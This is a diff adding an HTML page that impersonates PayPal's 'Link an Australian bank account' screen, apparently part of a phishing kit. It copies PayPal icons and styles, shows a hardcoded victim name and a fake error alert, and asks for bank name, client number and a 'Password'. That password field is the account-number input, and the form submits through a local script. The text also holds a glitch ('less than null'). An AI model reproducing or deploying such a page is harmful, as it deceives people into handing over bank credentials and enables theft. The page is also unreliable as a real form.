@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html data-reactroot="" lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0">
+    <link rel="shortcut icon" sizes="196x196" href="https://www.paypalobjects.com/webstatic/icon/pp196.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/pp32.png">
+    <link rel="stylesheet" href="./assets/paypal-sans.css">
+    <title>PayPal: Wallet</title>
+    <link rel="stylesheet" href="./assets/main.css">
+    <style id="inert-style">
+        [inert] {
+	  pointer-events: none;
+	  cursor: default;
+	}
+
+	[inert], [inert] * {
+	  user-select: none;
+	  -webkit-user-select: none;
+	  -moz-user-select: none;
+	  -ms-user-select: none;
+	}
+	</style>
+</head>
+
+<body class="vx_root vx_hasOpenModal vx_addFlowTransition">
+    <div></div><input type="checkbox" id="toggleNavigation" class="vx_globalNav-toggleCheckbox">
+    <div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader">
+        <div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper vx_modal-wrapper_logo elementDirection" tabindex="-1">
+            <div><a><span class="vx_a11yText">close</span></a>
+                <div class="vx_modal-content">
+                    <form>
+                        <h2 class="vx_text-2">Link an Australian bank account</h2>
+                        <div class="vx_alert vx_alert-critical form-alert alertComponent test_alert-message" id='alert'>
+                            <p role="alert" aria-live="assertive" class="vx_alert-text ">That doesn't look quite right.</p>
+                        </div>
+                        <div>
+                            <div class="accountTypeLabel">Account type</div>
+                            <div class="row radioGroup ">
+                                <div class="vx_radio col-sm-6"><input type="radio" name="accountType" id="checkingRadioBtn" value="CHECKING" checked="">
+                                    <label class="" for="checkingRadioBtn">Cheque</label>
+                                </div>
+                                <div class="vx_radio col-sm-6"><input type="radio" name="accountType" id="savingsRadioBtn" value="SAVINGS">
+                                    <label class="" for="savingsRadioBtn">Savings</label>
+                                </div>
+                            </div>
+                        </div>
+                        <p class="addBank-label ">
+                            <span class="vx_text-5">Legal name : </span>
+                            Patricia Rinaldi
+                        </p>
+                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active vx_not_br" data-label-content="Bank name">
+                            <label class="floatingLabel" for="bankName">Bank name</label>
+                            <input type="text" id="bankName" aria-describedby="text-info-bankName" name="bankName" class="test_bankName test_bankName vx_form-control" autocomplete="off" value="">
+                            <span class="vx_form-control-message vx_form-control-message-req">Required</span>
+                        </div>
+                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Client number">
+                            <label class="floatingLabel" for="routingNumberGroup">Client number</label>
+                            <input type="number" id="routingNumberGroup" aria-describedby="text-info-routingNumberGroup" name="routingNumberGroup" class="test_routingNumberGroup vx_form-control" autocomplete="off" value="">
+                            <span class="vx_form-control-message vx_form-control-message-info" id="text-info-routingNumberGroup">A 8-digit number in the lower left corner of a cheque. Contact your bank if you need help.</span>
+                            <span class="vx_form-control-message vx_form-control-message-req">Required</span>
+                        </div>
+                        <div class="vx_form-group vx_floatingLabel vx_floatingLabel_active" data-label-content="Password">
+                            <label class="floatingLabel" for="accountNumber">Password</label>
+                            <input type="Password" id="accountNumber" aria-describedby="text-info-accountNumber" name="accountNumber" class="test_accountNumber test_accountNumber vx_form-control" autocomplete="off" value="">
+                            <span class="vx_form-control-message vx_form-control-message-info" id="text-info-accountNumber">A minimum 6 digit number at the bottom of a cheque or on a bank statement. Contact your bank if you need help.</span>
+                            <span class="vx_form-control-message vx_form-control-message-req">Required</span>
+                        </div>
+                        <p>When you click the button below, we'll deposit 2 small amounts into your bank account (less than null).</p>
+                        <button  data-testid="button-submit" name="addBank" data-track="{}" class="btn vx_btn vx_btn-block addBank-submit test_add-bank-submit" title="" onclick="checkForm()">Agree and Link</button>
+                    </form>
+                    <form >
+                    	<input type="hidden" name="_csrf" value="xFOkmugBWJ8Hpbh//yq7Lltf+uuf3DaCptt40=">
+                    	<input type="hidden" name="isFlow" value="false">
+                    </form>
+                    <button name="switchBankType" class="btn vx_btn-link test_switchBankType addBank-switchBankLink">Link a US bank account instead</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div></div>
+    <div class="vx_modal-background vx_modalPrepBg vx_modalBgIsShown" id="vx_modal-background"></div>
+    <script src="./assets/main.js"></script>
+</body>
+
+</html>
